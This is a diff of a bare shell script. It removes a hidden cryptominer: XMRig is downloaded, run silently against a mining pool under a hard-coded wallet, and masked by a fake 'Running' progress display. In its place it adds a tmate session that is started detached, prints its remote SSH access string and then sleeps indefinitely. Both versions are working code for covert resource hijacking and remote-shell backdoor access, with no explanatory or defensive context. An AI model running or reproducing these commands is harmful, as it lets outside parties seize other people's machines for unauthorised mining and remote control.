@@ -1,3 +1,7 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-x64.tar.gz && tar -xf xmrig-6.21.1-linux-x64.tar.gz && cd xmrig-6.21.1
-./xmrig -o stratum+ssl://rx.unmineable.com:443 -a rx -k -u LTC:LadbX3EU6DPYrqrKuLJhGvwkSiAbEXpbvi.WORKE1 -p x -t 4 &>/dev/null &
-seq 1 43200 | while read i; do echo -en "\r Running .     $i s /43200 s";sleep 0.1;echo -en "\r Running ..    $i s /43200 s";sleep 0.1;echo -en "\r Running ...   $i s /43200 s";sleep 0.1;echo -en "\r Running ....  $i s /43200 s";sleep 0.1;echo -en "\r Running ..... $i s /43200 s";sleep 0.1;echo -en "\r Running     . $i s /43200 s";sleep 0.1;echo -en "\r Running  .... $i s /43200 s";sleep 0.1;echo -en "\r Running   ... $i s /43200 s";sleep 0.1;echo -en "\r Running    .. $i s /43200 s";sleep 0.1;echo -en "\r Running     . $i s /43200 s";sleep 0.1; done
+pkill -9 tmate
+wget -nc https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
+tar --skip-old-files -xvf tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
+rm -f nohup.out; bash -ic 'nohup ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock new-session -d & disown -a' >/dev/null 2>&1
+./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock wait tmate-ready
+./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "#{tmate_ssh}"
+sleep 9999999999
